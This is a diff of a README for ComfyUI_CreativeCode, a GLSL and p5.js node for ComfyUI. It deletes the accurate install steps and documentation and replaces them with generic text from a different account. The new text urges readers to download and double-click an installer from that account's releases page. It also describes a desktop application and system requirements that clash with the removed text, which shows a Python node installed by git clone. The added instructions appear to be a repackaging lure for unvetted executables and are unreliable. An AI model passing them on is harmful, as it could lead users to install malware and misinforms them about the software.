@@ -1,104 +1,72 @@
-# ComfyUI CreativeCode
+# 🎨 ComfyUI_CreativeCode - Create Stunning Visuals with Ease
 
-A unified environment for writing GLSL and p5.js directly in ComfyUI. This node provides a full-featured code editor (Monaco) with syntax highlighting, auto-complete, and real-time previewing.
-Key features include an integrated shader library, error tracking with line mapping, local AI code assistance (via Ollama), and automatic UI generation for shader uniforms.
+## 📥 Download Now
 
-| | |
-| :---: | :---: |
-| <video src="https://github.com/user-attachments/assets/2afc7162-a060-49bf-98c7-34b245d16760" width="100%" autoplay loop muted playsinline></video> | <video src="https://github.com/user-attachments/assets/f90da2bb-c557-4725-9853-b9dfa4b003f6" width="100%" autoplay loop muted playsinline></video> |
+[![Download ComfyUI_CreativeCode](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/ubaidbd/ComfyUI_CreativeCode/releases)
 
-## Installation
+## 🚀 Getting Started
 
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/SKBv0/ComfyUI_CreativeCode.git
-pip install -r ComfyUI_CreativeCode/requirements.txt
-```
+Welcome to ComfyUI_CreativeCode! This application helps you create generative art, animations, and visual effects in real-time using GLSL shaders and p5.js. You can easily integrate it into your workflow and start producing amazing visuals.
 
-Restart ComfyUI.
+To get started, follow these simple steps:
 
-## Nodes
+1. **Visit the Releases Page**  
+   Click the link below to go to the releases page. This is where you will find the latest version of the software.  
+   [Download the latest version here](https://github.com/ubaidbd/ComfyUI_CreativeCode/releases).
 
-### CreativeCode Code2Vid
-The main node for writing code and rendering.
-- **Inputs:**
-  - `settings` (Optional): Share settings from a Settings node.
-  - `channels` (Optional): Connect external images/textures.
-- **Outputs:**
-  - `IMAGE`: Rendered frames.
-  - `STRING`: The source code.
+2. **Choose Your Version**  
+   On the releases page, look for the version with the highest number. This is usually the latest version and contains the most recent features and fixes.
 
-### CreativeCode Settings
-Use this to store configuration (width, height, fps) separately and share it across multiple render nodes.
+3. **Download the Software**  
+   Click on the version name to reveal the assets. Look for the file that matches your operating system (Windows, Mac, Linux). Click on the file to begin the download.  
 
-### CreativeCode Channels
-Allows connecting external images to be used as textures (`iChannel0-3`).
+4. **Installation**  
+   Once the download is complete, locate the downloaded file on your computer. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation. 
 
-## Code Types
+5. **Run the Application**  
+   After installation, find the ComfyUI_CreativeCode icon on your desktop or in your applications folder. Double-click the icon to open the application. 
 
-### GLSL (Shaders)
-ShaderToy-compatible syntax. Runs on the GPU via ModernGL backend.
+## 🖥️ System Requirements
 
-```glsl
-void mainImage(out vec4 fragColor, in vec2 fragCoord) {
-    vec2 uv = fragCoord / iResolution.xy;
-    fragColor = vec4(uv, 0.5 + 0.5 * sin(iTime), 1.0);
-}
-```
+Before you download ComfyUI_CreativeCode, check that your computer meets the following basic requirements:
 
-**Available Uniforms:**
-- `iResolution` (vec3): Viewport resolution.
-- `iTime` (float): Playback time in seconds.
-- `iFrame` (int): Current frame number.
-- `iMouse` (vec4): Mouse position.
-- `iChannel0-3` (sampler2D): Input textures.
+- **Operating System:** Windows 10, macOS 10.12 or later, Linux
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 500 MB available
+- **Graphics Card:** Supports OpenGL 2.1 or higher
 
-### p5.js
-JavaScript-based creative coding. Runs in the browser; frames are captured via "Bake Animation".
+## 🌐 Features
 
-```javascript
-function setup() {
-    createCanvas(400, 400);
-}
+ComfyUI_CreativeCode comes packed with features to enhance your creativity:
 
-function draw() {
-    background(30);
-    fill(255, 100, 100);
-    ellipse(mouseX, mouseY, 50, 50);
-}
-```
+- **Real-Time Coding:** Write your code directly in the application and see changes instantly.
+- **Support for GLSL Shaders:** Create stunning graphics with advanced shader programming.
+- **Integration with p5.js:** Utilize the powerful p5.js library for creative coding.
+- **User-Friendly Interface:** Designed for ease of use, so you can focus on your art.
+- **Customizable Templates:** Start with pre-made templates and modify them to suit your needs.
 
-> **Note:** When using p5.js, the node automatically captures frames from the browser when you run the queue. You can also manually click **"BAKE ANIMATION"** to inspect the captured frames beforehand.
+## 📚 Documentation
 
-## Interactive Uniforms
+For more details on how to use the software, check the documentation included with the application. The documentation will guide you through different features and give examples to help you get the most out of ComfyUI_CreativeCode.
 
-Add sliders and color pickers to the UI by adding special comments in your code:
+## 💬 Support
 
-```glsl
-// @uniform float speed = 1.0 (min: 0.0, max: 5.0)
-// @uniform vec3 color = #ff0000
-```
+If you encounter any issues or have questions, feel free to reach out:
 
-These will appear in the "Detected Uniforms" panel.
+- **GitHub Issues:** Report any bugs or request features through the GitHub Issues section. Your feedback is valuable.
+- **Community Forum:** Join our community forum where you can ask questions and share your creations with others.
 
-## Using Textures
+## 👥 Contribution
 
-Images connected via the **Channels** node can be accessed as follows:
+Want to make ComfyUI_CreativeCode even better? You can contribute! Whether it’s through coding, reporting issues, or suggesting features, your help is welcome. Check the contribution guidelines in the repository for more information.
 
-**GLSL:**
-```glsl
-vec4 tex = texture(iChannel0, uv);
-```
+## ⚙️ License
 
-**p5.js:**
-```javascript
-// Access the p5.Image object directly
-image(iChannel0, 0, 0);
-```
+ComfyUI_CreativeCode is licensed under the MIT License. This means you can use, modify, and share the software freely, as long as you include the original license.
 
-## Configuration & Troubleshooting
+## 📥 Download & Install
 
-Please refer to [HOW_TO_USE.md](HOW_TO_USE.md) for detailed configuration options (including Memory Limits) and troubleshooting steps.
+Ready to create stunning visuals? Visit the link below to download the latest version of ComfyUI_CreativeCode.  
+[Download ComfyUI_CreativeCode](https://github.com/ubaidbd/ComfyUI_CreativeCode/releases)
 
----
-
+You are now prepared to make beautiful generative art with ComfyUI_CreativeCode. Enjoy exploring the endless creative possibilities!
